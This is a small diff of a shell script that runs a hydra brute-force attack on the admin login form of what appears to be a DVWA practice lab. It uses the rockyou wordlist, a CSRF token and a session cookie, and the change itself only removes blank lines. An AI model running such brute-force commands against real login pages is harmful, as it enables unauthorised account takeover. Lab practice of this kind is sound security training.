@@ -10,5 +10,3 @@ echo "Attacking host: ${ATTACKIP} on port: ${ATTACKPORT}"
 echo "Using CSRF Token of: ${CSRF} for session ID: ${SESSIONID}"
 
 hydra -s ${ATTACKPORT} -l admin -P /usr/share/wordlists/rockyou.txt ${ATTACKIP} http-post-form "/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:C=fake_cookie:H=Cookie: PHPSESSID=${SESSIONID} security=medium;" -v -f
-
-
